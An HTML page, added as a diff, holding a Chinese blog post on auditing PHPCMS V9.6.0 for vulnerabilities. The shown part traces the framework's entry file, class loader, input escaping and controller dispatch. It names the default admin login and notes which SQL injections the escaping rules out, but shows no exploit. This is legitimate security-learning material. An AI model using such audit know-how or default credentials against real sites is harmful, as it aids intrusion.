@@ -1,0 +1,799 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="jelly">
+  <meta name="keywords" content="">
+  
+  <title>通过 PHPCMS 学习 php 代码审计 - jelly&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":"14de5c0cf6db6044f06b32ef50694a98","google":"G-1S553HH16G","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Jelly's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/doll.webp') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="通过 PHPCMS 学习 php 代码审计">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-09-15 23:50" pubdate>
+        2021年9月15日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      7.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      109
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">通过 PHPCMS 学习 php 代码审计</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2 分钟前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>为了练习练习php代码审计，这次选中了PHPCMS V9.6.0，这个版本大致发布与2015年12月，因为该版本具有几个有趣的漏洞，大概在2017年4月爆出，审计下来应该收获不少</p>
+<p>phpcms也是一个网站内容管理系统，官网已经访问不了了。目前看到phpcms还在维护版本为v9.6.4</p>
+<p>其实这个CMS现在也没落了，但我在看 PHPCMS 的介绍（很多介绍都来自百度百科）时对它的历史还是小有兴趣。</p>
+<hr>
+<p>PHPCMS最早于2005年发布，老版本一般以年份命名，最出名的老版本是PhpCMS2008</p>
+<p>在2008年酷6网收购phpcms，2009年盛大收购酷6网，PHPCMS业务也被整体移交给盛大</p>
+<p>2010年12月29号phpcms v9正式版发布，也就是本文要审计的系列</p>
+<p>以上的具体时间可能有些出入，但可以大致看出PHPCMS活跃的年代。PHPCMS流行时，甚至一度和帝国、DedeCMS称为国内大三CMS</p>
+<p>我甚至还在网上找到了PHPCMS V9的开发文档，可见它确实火过哈哈哈</p>
+<p>开发文档：<a target="_blank" rel="noopener" href="http://phpcms.p2hp.com/">http://phpcms.p2hp.com/</a>        <a target="_blank" rel="noopener" href="https://www.w3cschool.cn/ph_cms/">https://www.w3cschool.cn/ph_cms/</a></p>
+<p>PHPCMS 论坛：<a target="_blank" rel="noopener" href="https://bbs.phpcms.pro/">https://bbs.phpcms.pro/</a></p>
+<p>安装过程就不记录了，记得选择 <em>全新安装PHPCMS V9</em>，因为这个我重新安装了一次。默认后台密码是phpcms/phpcms</p>
+<img src="img/phpcms/image-20210827142457806.png" srcset="/img/loading.gif" lazyload alt="image-20210827142457806" style="zoom:50%;" />
+
+<h1 id="0x01-全局分析"><a href="#0x01-全局分析" class="headerlink" title="0x01 全局分析"></a>0x01 全局分析</h1><p>PHPCMS V9 的框架就比较成熟了，为了弄清PHPCMS的流程，来跟踪一下index.php的执行流程</p>
+<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><blockquote>
+<p>index.php</p>
+</blockquote>
+<p>index.php就是PHPCMS V9的入口文件，即使是后台应用也需要通过这个入口文件，可以看到在 PHPCMS 中入口文件只有3行代码了</p>
+<ul>
+<li>定义 <code>PHPCMS_PATH</code> 常量，为PHPCMS的web根目录</li>
+<li>加载 <code>phpcms/base.php</code> 文件，这是<strong>PHPCMS框架</strong>的引导文件（注意了，PHPCMS是有一个明显的框架结构）。base.php会定义大量常量和 <code>pc_base类</code></li>
+<li>调用 <code>pc_base类</code> 中的 <code>creat_app()</code> 方法，初始化应用程序</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>define(<span class="hljs-string">&#x27;PHPCMS_PATH&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>).DIRECTORY_SEPARATOR);<br><span class="hljs-keyword">include</span> PHPCMS_PATH.<span class="hljs-string">&#x27;/phpcms/base.php&#x27;</span>;<br>pc_base::creat_app();<br></code></pre></td></tr></table></figure>
+
+<h2 id="base-php"><a href="#base-php" class="headerlink" title="base.php"></a>base.php</h2><blockquote>
+<p>phpcms/base.php</p>
+</blockquote>
+<p>index.php入口文件主要通过加载base.php去完成大量初始化工作，base.php主要做了以下工作</p>
+<h3 id="1、定义常量"><a href="#1、定义常量" class="headerlink" title="1、定义常量"></a>1、定义常量</h3><img src="img/phpcms/image-20210713164008292.png" srcset="/img/loading.gif" lazyload alt="image-20210713164008292" style="zoom: 33%;" />
+
+<h3 id="2、定义-pc-base类"><a href="#2、定义-pc-base类" class="headerlink" title="2、定义 pc_base类"></a>2、定义 <code>pc_base类</code></h3><p>该类定义了很多静态方法如初始化应用程序，加载函数，加载类，自动加载等方法。通过 <code>类名::属性/方法</code> 的方式调用</p>
+<blockquote>
+<p>这里记录一个小小的web开发知识点，很多程序喜欢用类名调用静态方法而不用实例化对象，这种方式占用内存低，效率更高</p>
+</blockquote>
+<p>这里为了更好理解后面的代码，分析一下<strong>pc_base类</strong>的常用静态方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pc_base</span> </span>&#123;<br>  	<span class="hljs-comment">// 加载系统类，$initialize决定是否实例化加载的类对象，其中限制了文件为：phpcms/libs/classes/$classname.class.php</span><br>  	<span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">load_sys_class</span>(<span class="hljs-params"><span class="hljs-variable">$classname</span>, <span class="hljs-variable">$path</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$initialize</span> = <span class="hljs-number">1</span></span>) </span>&#123;<br>				<span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::_load_class(<span class="hljs-variable">$classname</span>, <span class="hljs-variable">$path</span>, <span class="hljs-variable">$initialize</span>);<br>		&#125;<br>  	<span class="hljs-comment">// 加载应用类，$initialize决定是否实例化加载的类对象，其中限制了文件为 phpcms/modules/$m/classes/$classname.class.php</span><br>  	<span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">load_app_class</span>(<span class="hljs-params"><span class="hljs-variable">$classname</span>, <span class="hljs-variable">$m</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$initialize</span> = <span class="hljs-number">1</span></span>) </span>&#123;<br>      	<span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::_load_class(<span class="hljs-variable">$classname</span>, <span class="hljs-string">&#x27;modules&#x27;</span>.DIRECTORY_SEPARATOR.<span class="hljs-variable">$m</span>.DIRECTORY_SEPARATOR.<span class="hljs-string">&#x27;classes&#x27;</span>, <span class="hljs-variable">$initialize</span>);<br>    &#125;<br>  	<span class="hljs-comment">// 加载系统的函数库，其中限制了文件为：phpcms/libs/functions/$func.func.php，这些文件都封装了很多常用函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">load_sys_func</span>(<span class="hljs-params"><span class="hljs-variable">$func</span></span>) </span>&#123;<br>      	<span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::_load_func(<span class="hljs-variable">$func</span>); <span class="hljs-comment">//底层是include实现</span><br>    &#125;<br>  	<span class="hljs-comment">// 加载配置文件，限制配置文件为：caches/configs/$file.php，其中配置项都以数组形式保存</span><br>  	<span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">load_config</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$default</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$reload</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>  			<span class="hljs-variable">$path</span> = CACHE_PATH.<span class="hljs-string">&#x27;configs&#x27;</span>.DIRECTORY_SEPARATOR.<span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br>      	<span class="hljs-variable">$configs</span>[<span class="hljs-variable">$file</span>] = <span class="hljs-keyword">include</span> <span class="hljs-variable">$path</span>;<br>    &#125;<br>  	<span class="hljs-comment">// 加载数据模型并实例化，其中限制了文件为：phpcms/model/$classname.class.php</span><br>  	<span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">load_model</span>(<span class="hljs-params"><span class="hljs-variable">$classname</span></span>) </span>&#123;<br>				<span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::_load_class(<span class="hljs-variable">$classname</span>,<span class="hljs-string">&#x27;model&#x27;</span>);<br>		&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>看了一圈下来感觉 <strong>pc_base类</strong> 其实也就是用于规划好的不同文件所在的位置，后面调用文件时直接去对应位置加载文件即可</p>
+<h3 id="3、加载公用函数库，配置文件"><a href="#3、加载公用函数库，配置文件" class="headerlink" title="3、加载公用函数库，配置文件"></a>3、加载公用函数库，配置文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 加载函数库，其中有大量公用函数</span><br>pc_base::load_sys_func(<span class="hljs-string">&#x27;global&#x27;</span>);<br>pc_base::load_sys_func(<span class="hljs-string">&#x27;extention&#x27;</span>);<br>pc_base::auto_load_func();<br><span class="hljs-comment">// 加载配置文件</span><br>pc_base::load_config(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;errorlog&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>其中加载的函数库文件包括 global.func.php，该文件定义了一些安全相关函数：</p>
+<ul>
+<li><p><code>remove_xss()</code> - xss过滤函数，主要过滤一些敏感字符</p>
+</li>
+<li><p><code>safe_replace()</code> - 过滤 <code>%20, &#39; , &quot;, &lt;, &gt;</code> 等敏感符号</p>
+</li>
+<li><p><code>new_addslashes()</code> - 底层是 <code>addslashes()</code> 实现</p>
+</li>
+</ul>
+<h2 id="app初始化"><a href="#app初始化" class="headerlink" title="app初始化"></a>app初始化</h2><p>上面提到入口文件中通过一行代码就实现了程序初始化，下面具体看看这行代码做了什么</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pc_base::creat_app();<br></code></pre></td></tr></table></figure>
+
+<p>在分析过程要有两个需要弄清的两个点：</p>
+<p>1、程序最终将封装在实例化 application 类</p>
+<p>creat_app() 就是实例化一个application类（具体代码下面看），下面为了方便称为app对象，程序从运行到结束会加载很多文件，都可以看做是app对象的操作</p>
+<p>2、静态调用和实例对象分别做了什么？</p>
+<p>静态调用只是实用类中的静态方法，不会影响类中的构造方法和属性；在phpcms中load_sys_class和其他方法具有实例化类对象的功能，从而加载的类会先执行一次构造方法，在下面的分析中要清晰的分析加载的类和自动实例化过程中要执行的构造方法</p>
+<h3 id="1、构造app对象"><a href="#1、构造app对象" class="headerlink" title="1、构造app对象"></a>1、构造app对象</h3><blockquote>
+<p>phpcms/base.php</p>
+</blockquote>
+<p>creat_app() 实际就是加载 <strong>phpcms/libs/classes/application.class.php</strong> ，然后会自动对 application.class.php 中的 application 类实例化，这里我称实例化的对象为<strong>app对象</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">creat_app</span>(<span class="hljs-params"></span>) </span>&#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::load_sys_class(<span class="hljs-string">&#x27;application&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">load_sys_class</span>(<span class="hljs-params"><span class="hljs-variable">$classname</span>, <span class="hljs-variable">$path</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$initialize</span> = <span class="hljs-number">1</span></span>) </span>&#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::_load_class(<span class="hljs-variable">$classname</span>, <span class="hljs-variable">$path</span>, <span class="hljs-variable">$initialize</span>);<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_load_class</span>(<span class="hljs-params"><span class="hljs-variable">$classname</span>, <span class="hljs-variable">$path</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$initialize</span> = <span class="hljs-number">1</span></span>) </span>&#123;<br>  	<span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$path</span>)) <span class="hljs-variable">$path</span> = <span class="hljs-string">&#x27;libs&#x27;</span>.DIRECTORY_SEPARATOR.<span class="hljs-string">&#x27;classes&#x27;</span>;<br>  	<span class="hljs-variable">$key</span> = md5(<span class="hljs-variable">$path</span>.<span class="hljs-variable">$classname</span>);<br>  	<span class="hljs-keyword">if</span> (file_exists(PC_PATH.<span class="hljs-variable">$path</span>.DIRECTORY_SEPARATOR.<span class="hljs-variable">$classname</span>.<span class="hljs-string">&#x27;.class.php&#x27;</span>)) &#123;<br>				<span class="hljs-keyword">include</span> PC_PATH.<span class="hljs-variable">$path</span>.DIRECTORY_SEPARATOR.<span class="hljs-variable">$classname</span>.<span class="hljs-string">&#x27;.class.php&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$initialize</span>) &#123;<br>          	<span class="hljs-comment">// 默认$initialize = 1，会实例化该类对象</span><br>            <span class="hljs-variable">$classes</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-keyword">new</span> <span class="hljs-variable">$name</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$classes</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-literal">true</span>;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>application.class.php</strong> 定义了 application 类，该类的构造方法如下，构造方法即<strong>app对象</strong>的实例化过程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">application</span> </span>&#123;<br>	<span class="hljs-comment">// 构造方法</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-variable">$param</span> = pc_base::load_sys_class(<span class="hljs-string">&#x27;param&#x27;</span>);<br>      define(<span class="hljs-string">&#x27;ROUTE_M&#x27;</span>, <span class="hljs-variable">$param</span>-&gt;route_m());<br>      define(<span class="hljs-string">&#x27;ROUTE_C&#x27;</span>, <span class="hljs-variable">$param</span>-&gt;route_c());<br>      define(<span class="hljs-string">&#x27;ROUTE_A&#x27;</span>, <span class="hljs-variable">$param</span>-&gt;route_a());<br>      <span class="hljs-keyword">$this</span>-&gt;init();<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="2、param类"><a href="#2、param类" class="headerlink" title="2、param类"></a>2、param类</h3><p><strong>app对象</strong> 首先需要加载 <code>phpcms/libs/classes/param.class.php</code> 的 <code>param类</code>，该类主要用于处理参数，其构造方法如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">param</span> </span>&#123;	<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-keyword">if</span>(!get_magic_quotes_gpc()) &#123;<br>        <span class="hljs-variable">$_POST</span> = new_addslashes(<span class="hljs-variable">$_POST</span>);<br>        <span class="hljs-variable">$_GET</span> = new_addslashes(<span class="hljs-variable">$_GET</span>);<br>        <span class="hljs-variable">$_REQUEST</span> = new_addslashes(<span class="hljs-variable">$_REQUEST</span>);<br>        <span class="hljs-variable">$_COOKIE</span> = new_addslashes(<span class="hljs-variable">$_COOKIE</span>);<br>      &#125;<br>      <span class="hljs-comment">// 加载路由配置文件</span><br>      <span class="hljs-keyword">$this</span>-&gt;route_config = pc_base::load_config(<span class="hljs-string">&#x27;route&#x27;</span>, SITE_URL) ? pc_base::load_config(<span class="hljs-string">&#x27;route&#x27;</span>, SITE_URL) : pc_base::load_config(<span class="hljs-string">&#x27;route&#x27;</span>, <span class="hljs-string">&#x27;default&#x27;</span>);<br>      ……   <br>    &#125;<br>  	<span class="hljs-comment">// 获取模型的方法，如果没有获取m参数，则采用路由配置文件的默认值，一般就是网站的首页</span><br>  	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">route_m</span>(<span class="hljs-params"></span>) </span>&#123;<br>     		<span class="hljs-variable">$m</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>] : (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) ? <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>);<br>        <span class="hljs-variable">$m</span> = <span class="hljs-keyword">$this</span>-&gt;safe_deal(<span class="hljs-variable">$m</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$m</span>)) &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;route_config[<span class="hljs-string">&#x27;m&#x27;</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-keyword">if</span>(is_string(<span class="hljs-variable">$m</span>)) <span class="hljs-keyword">return</span> <span class="hljs-variable">$m</span>;<br>        &#125; <br>    &#125;<br>  	<span class="hljs-comment">// 获取控制器、事件的方法同上</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">route_c</span>(<span class="hljs-params"></span>) </span>&#123;&#125;<br>  	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">route_a</span>(<span class="hljs-params"></span>) </span>&#123;&#125;<br>&#125;  <br></code></pre></td></tr></table></figure>
+
+<p>可以看到GPC数据会被过滤，看到这里就可以放弃一些引号包裹的sql注入了</p>
+<h3 id="3、app对象的初始化"><a href="#3、app对象的初始化" class="headerlink" title="3、app对象的初始化"></a>3、app对象的初始化</h3><p>app 对象通过<code>route_m()</code>, <code>route_c()</code>, <code>route_a()</code> 分别用于获取 <code>$_GET</code> 或 <code>$_POST</code> 中的 m, c, a参数，在PHPCMS9中 “m”代表模型，“c”代表控制器，“a”代表事件</p>
+<p>它们的值都有具体对应的文件，<strong>m模型</strong>就是<code>phpcms/modules/</code>目录下的各个目录</p>
+<img src="img/phpcms/image-20210713182222226.png" srcset="/img/loading.gif" lazyload alt="image-20210713182222226" style="zoom:50%;" />
+
+<p><strong>c控制器</strong> 对应的就是 <code>模型目录</code> 下对应的php文件名或具体类名（文件名和类名一致）</p>
+<img src="img/phpcms/image-20210713182428172.png" srcset="/img/loading.gif" lazyload alt="image-20210713182428172" style="zoom:50%;" />
+
+<p><strong>a事件</strong> 对应这位类中定义的方法</p>
+<img src="img/phpcms/image-20210713182640994.png" srcset="/img/loading.gif" lazyload alt="image-20210713182640994" style="zoom:50%;" />
+
+<p>app对象获取到mca后，通过 <code>init()</code> 方法完成app对象初始化工作</p>
+<p>看到 init() 方法代码去加载对应文件，最终通过 <code>call_user_func()</code>去执行对应的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// phpcms/libs/classes/application.class.php : class application</span><br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;<br>		<span class="hljs-variable">$controller</span> = <span class="hljs-keyword">$this</span>-&gt;load_controller();<br>		<span class="hljs-keyword">if</span> (method_exists(<span class="hljs-variable">$controller</span>, ROUTE_A)) &#123;<br>			<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^[_]/i&#x27;</span>, ROUTE_A)) &#123;<br>				<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;You are visiting the action is to protect the private action&#x27;</span>);<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>				call_user_func(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$controller</span>, ROUTE_A));<br>			&#125;<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Action does not exist.&#x27;</span>);<br>		&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
